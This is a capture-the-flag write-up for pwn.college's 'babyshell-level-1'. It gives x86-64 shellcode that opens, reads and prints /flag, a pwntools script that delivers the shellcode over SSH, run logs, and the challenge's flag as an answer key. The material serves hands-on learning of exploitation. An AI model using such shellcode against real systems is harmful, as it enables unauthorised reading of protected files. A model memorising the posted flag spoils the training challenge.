There is a flag  `/flag`

We need to run shell code that adds flag to the stack , opens the file, reads the flag, then writes the data and exits.

syscall is used to open the file, read the file, write to stdout and then exit.

Flag - ```pwn.college{MXP3wt_fvn3dewe94CKbygOJfAq.01NxIDLxEzN0czW}```

```python
from pwn import *

context.arch='amd64'
context.os='linux'

code=asm('''
    mov rax, 0x00000067616c662f         
    push rax                            
    mov rdi, rsp          
    mov rsi, 0                          
    mov rax, 2                          
    syscall
    mov rdi, rax                        
    mov rsi, rsp                        
    mov rdx, 1000                       
    mov rax, 0                          
    syscall
    mov rdi, 1                          
    mov rsi, rsp                        
    mov rdx, rax                        
    mov rax, 1                          
    syscall
    mov rdi, 42                         
    mov rax, 60                         
    syscall
''')
file="/challenge/babyshell-level-1"
host='pwn.college'
username='hacker'
keypath = '~/key'

ssh_connection = ssh(user=username, host=host, keyfile=keypath)

process=ssh_connection.process(file)

process.recvuntil("Reading 0x1000 bytes from stdin.")
process.sendline(code)
process.interactive()
ssh_connection.close()
```

```
x] Connecting to pwn.college on port 22
[+] Connecting to pwn.college on port 22: Done
[*] hacker@pwn.college:
    Distro    Ubuntu 20.04
    OS:       linux
    Arch:     amd64
    Version:  6.8.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[x] Starting remote process None on pwn.college
[+] Starting remote process None on pwn.college: pid 320
[!] ASLR is disabled for '/challenge/babyshell-level-1'!
/home/fiendfyre/Documents/CTFdump/temp3.py:80: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  process.sendline(code)
[*] Switching to interactive mode


This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007fff5c304a30 | 48 b8 2f 66 6c 61 67 00 00 00                 | movabs rax, 0x67616c662f
0x00007fff5c304a3a | 50                                            | push rax
0x00007fff5c304a3b | 48 89 e7                                      | mov rdi, rsp
0x00007fff5c304a3e | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007fff5c304a45 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007fff5c304a4c | 0f 05                                         | syscall 
0x00007fff5c304a4e | 48 89 c7                                      | mov rdi, rax
0x00007fff5c304a51 | 48 89 e6                                      | mov rsi, rsp
0x00007fff5c304a54 | 48 c7 c2 e8 03 00 00                          | mov rdx, 0x3e8
0x00007fff5c304a5b | 48 c7 c0 00 00 00 00                          | mov rax, 0
0x00007fff5c304a62 | 0f 05                                         | syscall 
0x00007fff5c304a64 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007fff5c304a6b | 48 89 e6                                      | mov rsi, rsp
0x00007fff5c304a6e | 48 89 c2                                      | mov rdx, rax
0x00007fff5c304a71 | 48 c7 c0 01 00 00 00                          | mov rax, 1
0x00007fff5c304a78 | 0f 05                                         | syscall 
0x00007fff5c304a7a | 48 c7 c7 2a 00 00 00                          | mov rdi, 0x2a
0x00007fff5c304a81 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007fff5c304a88 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{MXP3wt_fvn3dewe94CKbygOJfAq.01NxIDLxEzN0czW}
[*] Got EOF while reading in interactive

[Done] exited with code=null in 42.398 seconds

[Running] python -u "/home/fiendfyre/Documents/CTFdump/temp3.py"
Warning: _curses.error: setupterm: could not find terminfo database

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
b'H\xb8/flag\x00\x00\x00PH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H\xc7\xc0\x02\x00\x00\x00\x0f\x05H\x89\xc7H\x89\xe6H\xc7\xc2\xe8\x03\x00\x00H\xc7\xc0\x00\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\x89\xc2H\xc7\xc0\x01\x00\x00\x00\x0f\x05H\xc7\xc7*\x00\x00\x00H\xc7\xc0<\x00\x00\x00\x0f\x05'
[x] Connecting to pwn.college on port 22
[+] Connecting to pwn.college on port 22: Done
[*] hacker@pwn.college:
    Distro    Ubuntu 20.04
    OS:       linux
    Arch:     amd64
    Version:  6.8.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[x] Starting remote process None on pwn.college
[+] Starting remote process None on pwn.college: pid 349
[!] ASLR is disabled for '/challenge/babyshell-level-1'!
/home/fiendfyre/Documents/CTFdump/temp3.py:79: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  process.recvuntil("Reading 0x1000 bytes from stdin.")
[*] Switching to interactive mode


This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffcaef49c60 | 48 b8 2f 66 6c 61 67 00 00 00                 | movabs rax, 0x67616c662f
0x00007ffcaef49c6a | 50                                            | push rax
0x00007ffcaef49c6b | 48 89 e7                                      | mov rdi, rsp
0x00007ffcaef49c6e | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffcaef49c75 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffcaef49c7c | 0f 05                                         | syscall 
0x00007ffcaef49c7e | 48 89 c7                                      | mov rdi, rax
0x00007ffcaef49c81 | 48 89 e6                                      | mov rsi, rsp
0x00007ffcaef49c84 | 48 c7 c2 e8 03 00 00                          | mov rdx, 0x3e8
0x00007ffcaef49c8b | 48 c7 c0 00 00 00 00                          | mov rax, 0
0x00007ffcaef49c92 | 0f 05                                         | syscall 
0x00007ffcaef49c94 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffcaef49c9b | 48 89 e6                                      | mov rsi, rsp
0x00007ffcaef49c9e | 48 89 c2                                      | mov rdx, rax
0x00007ffcaef49ca1 | 48 c7 c0 01 00 00 00                          | mov rax, 1
0x00007ffcaef49ca8 | 0f 05                                         | syscall 
0x00007ffcaef49caa | 48 c7 c7 2a 00 00 00                          | mov rdi, 0x2a
0x00007ffcaef49cb1 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffcaef49cb8 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{MXP3wt_fvn3dewe94CKbygOJfAq.01NxIDLxEzN0czW}
```